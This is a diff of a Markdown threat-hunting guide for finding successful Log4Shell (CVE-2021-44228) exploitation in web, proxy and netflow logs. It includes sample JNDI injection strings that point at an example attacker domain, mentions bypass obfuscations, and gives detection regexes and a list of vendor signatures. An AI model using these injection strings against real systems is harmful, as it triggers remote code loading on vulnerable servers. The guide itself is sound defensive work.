@@ -2,7 +2,15 @@
 
 As the log4j "sawdust" settles, many Organizations may want to take further proactive steps to hunt for current or prior abuse of cve-2021-44228 in their environment.
 
-This resource takes a threat hunting approach to identifying evidence of successful exploitation of this vulnerability. It is not inteded to soley replace detection of attacks on the network; a role that is ideally primarily fulfilled by existing security products, but instead takes advantage of the "noisy" nature of the attack to systematically hunt for successful outcomes of the attempted attacks against vulnerable assets across an environment.
+This resource takes a threat hunting approach to identifying evidence of successful exploitation of this vulnerability. This is not intended to solely replace detection of attacks on the network; a role that is ideally primarily fulfilled by existing security products, but instead takes advantage of the "noisy" nature of the attack to systematically hunt for successful outcomes of the attempted attacks against vulnerable assets across an environment.
+
+We are intentionally not using security control alerts for our initial scope our initial investigation. These alerts should not be ignored - the records these alerts provide can be used if the alert contains the URI, User-AgentStrings, or other fields mentioned later that may contain the attack. However, keep in mind that Threat Hunting is most valuable when it identifies true threats that the SOC has not already triaged. Therefore data from things like NTAs, NG-Firewall HTTP logs or Proxys, or even Web Server logs (which is what we use here for examples) will be more valuable than IPS alerts Log4j attack logs.
+
+Also, consider that SOC triages alerts from security controls. Their deliverable is a determination on whether a notable event that has been surfaced requires additional escalation or not. A Threat Hunter delivers a compromise assessment:
+
+1. I am reasonably certain the system/environment is safe​
+2. I am reasonably certain the system/environment is compromised​
+3. I am uncertain and will need to conduct more analysis
 
 ### Hunt 1: Device Performing Log4j Attack Resolutions Connection
 **Hunt Methodology: Hypothesis Driven** <br>
@@ -27,7 +35,7 @@ This resource takes a threat hunting approach to identifying evidence of success
 1. String payload is placed in headers, input fields or query and body parameters.   
 2. Software running Log4j processes event or a log of the event containing the string and executes as directed by lookup feature provided by the vulnerable `jndilookup.class`. This Java Naming Directory Interface is the API that allows Java Apps to perform searches for objects in their names. It is located in the Java Archive file for the particular running Log4j instance.
 
-This string is sent as input from a client and can be logged in multiple times in multiple palces (one of the challanges about this attack). By this nature, the  attack is fairly "noisy" and evidence of attacks in an environment should not be difficult to collect. The nature of the attack also provides investigators and hunters a description of what actions the adversary attempted to do instruct the targets to perform.
+This string is sent as input from a client and can be logged in multiple times in multiple palces (this is one of the challenges about this attack). By this nature, the  attack is fairly "noisy" and evidence of attacks in an environment should not be difficult to collect. The nature of the attack also provides investigators and hunters a description of what actions the adversary attempted to instruct the targets to perform.
 
 Lets look at an example:
 `${jndi:ldap://caffeinatedsheep.com/a}`
@@ -46,20 +54,17 @@ The following are outlines for the separate hunts. Details on how to perform eac
 ### The Hunt: Network Resource
 1. [**Scoping out a Query**](#scoping-out-a-query): Scope all relevant logs using the `${jndi\:` string. Create an output that you can run additional analysis on.
 2. [**Threat Extraction**](#threat-extraction): Extract indicators to use for successful attack identification. <br>
-3. [**Scope Reduction**:](#scope-reduction-netconnect) Filter results to those that contain protocol resolutions; exclude the base64 command events which will be hunted separately.
-regular expression: `:(?:\/){1,2}(?<threat>(?<threat_host>(?:[[:alnum:]]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[[:alnum:]]|\.){1,})))`
-4. [**Successful Attack Identification**:](#successful-attack-identification-netconnect) Run the exported list against a comprehensive record of netflow data during attack timeline.
-5. [**Analyze Results**:](#analyze-results) Review the results and contain, remediate, and escalate where necessary.  
+regular expression example: `:(?:\/){1,2}(?<threat>(?<threat_host>(?:[[:alnum:]]|\-|\.){1,})[\/|:](?:(?<threat_port>[0-9]{2,6})|(?<threat_content>(?:[[:alnum:]]|\.){1,})))`
+3. [**Successful Attack Identification: NetConnect**:](#successful-attack-identification-netconnect) Run the exported list against a comprehensive record of netflow data during attack timeline.
+4. [**Analyze Results**:](#analyze-results) Review the results and escalate, contain, remediate, where necessary.  
 
 ### The Hunt: Base64 Command Execution
 1. [**Scoping out a Query**](#scoping-out-a-query) Scope all relevant logs using the `${jndi\:` string. Create an output that you can run additional analysis on.
 2. [**Threat Extraction**](#threat-extraction) Extract indicators to use for successful attack identification. <br>
-3. [**Scope Reduction**:](#scope-reduction-base64) Filter results to those that contain base64 command events.
-regular expression: `\/Base64\/(?<base64_threat>[A-Za-z\d+\/]*(?:==|=|[A-Za-z\d+\/]))[|}]`
-4. [**Base64 Decoding**:](#base64-decoding) Using built in tools, or tools like `base64 -d` in linux or CyberChef, decode the base 64 to get the commands that were executed.
-5. [**Network Threat Extraction**:](#network-threat-extraction-base64) Extract the network indicators to run against your netflow data.
-6. [**Successful Attack Identification**:](#successful-attack-identification-base64) Run the exported list against a comprehensive record of netflow data during attack timeline. Additionally, run the execution commands against endpoint data.
-7. [**Analyze Results**:](#analyze-results) Review the results and contain, remediate, and escalate where necessary.  
+regular expression example: `\/Base64\/(?<base64_threat>[A-Za-z\d+\/]*(?:==|=|[A-Za-z\d+\/]))[|}]`
+3. [**Base64 Decoding**:](#base64-decoding) Using built in tools, or tools like `base64 -d` in linux or CyberChef, decode the base 64 to get the commands that were executed.
+4. [**Successful Attack Identification: Base64**:](#successful-attack-identification-base64) Run the exported list against a comprehensive record of netflow data during attack timeline. Additionally, run the execution commands against endpoint data.
+5. [**Analyze Results**:](#analyze-results) Review the results and escalate, contain, remediate, where necessary.   
 
 
 ### Scoping out a Query
@@ -151,6 +156,20 @@ ${jndi:ldap://caffeinatedsheep.com/a
 ${jndi:dns://caffeinatedsheep.com/a
 ```
 
+Just as Vulnerability Scanning vendors were coming out with new packages to detect places where Log4j could be found that they had missed, Detection Vendors to were releasing new signatures to try to detect the attack when it occurred with means to bypass current detection signatures. For example, we can consider PaloAlto - a great security detection producer who created several packages related to Log4j vulnerbaility discoveries.
+
+| Date | ID | Threat Name | CVE | Severity |
+|---|---|---|---|---|
+| 9-Dec | 91991 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-44228,CVE-2021-45046 | critical |
+| 12-Dec | 91994 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-44228,CVE-2021-45046 | critical |
+| 12-Dec | 91995 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-44228,CVE-2021-45046 | critical |
+| 14-Dec | 92001 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-44228,CVE-2021-45046 | critical |
+| 16-Dec | 92004 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-44228 | critical |
+| 16-Dec | 92006 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-4104 | high |
+| 17-Dec | 92007 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-45046 | critical |
+| 18-Dec | 92012 | Apache Log4j Denial-of-Service Vulnerability | CVE-2021-45105 | high |
+| unknown | 92035 | Apache Log4j Remote Code Execution Vulnerability | CVE-2021-44832 | medium |
+
 There are other methods as well such as pulling in null values like improper dates or this string which calls null environment variables before each letter.
 
 ```
@@ -165,9 +184,11 @@ Therefore our searches must account for these bypass method. We will not only ha
 
 #### regex: `((?:\$\{(?:[[:alnum:]]){1,}){1,3}\:.{1,}\})`
 
-**Update:** This regex is not sufficient to catch all forms of bypasses. You can see here  list of bypass examples that this pattern does not match agains.
+**Note:** This regex is not sufficient to catch all forms of bypasses. You can see here  list of bypass examples that this pattern does not match against.
 
 <h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/regex-bypass.png" width="700px"></h1>
+
+I highly recommend reviewing [Florian Roth's yara rules on GitHub](https://github.com/Neo23x0/signature-base/blob/a383746512f1ef70999b541396bd5499a9134601/yara/expl_log4j_cve_2021_44228.yar) to preview of the strings you may want to match against, as well as some false positives to avoid.
 
 ### Threat Extraction
 Categorize the events based on Base64 encoding or remote network querying.
@@ -204,20 +225,14 @@ sed: -e expression #1, char 12: unexpected `}'`
 
 I will research or write a Python script later to accomplish this.
 
-
-
-## To Be Continued -- work in progress
-
-### Scope Reduction NetConnect
-Extract indicators to use for successful attack identification and run a list of indicators against netflow data and endpoint data.
-
-
-### Scope Reduction Base64
-Extract indicators to use for successful attack identification and run a list of indicators against netflow data and endpoint data.
-
 ### Base64 Decoding
+With paid solutions you may be able to do this in a SIEM. Alternatively you can do it in the command line with `base64`. You can also use `iocextract` to get your network indicators into a workable format if you are not working out of a SIEM such as Splunk.
 
-### Network Threat Extraction Base64
+Notice in the following example there are several types of output. Simple IPs exist which will be used in the next step. But there are also some URLs which provide additional information as well as another base64 that will need to be decoded again and handled separately. Someone was trying to be evasive.
+
+<h1><img src="https://github.com/christian-taillon/log4shell-hunting/blob/main/terminal_base64.png" width="700px"></h1>
+
+To make this easier and clean up the output I have provided a very simple script that takes a few extra steps to find and sort unique values.
 
 ### Successful Attack Identification NetConnect
 
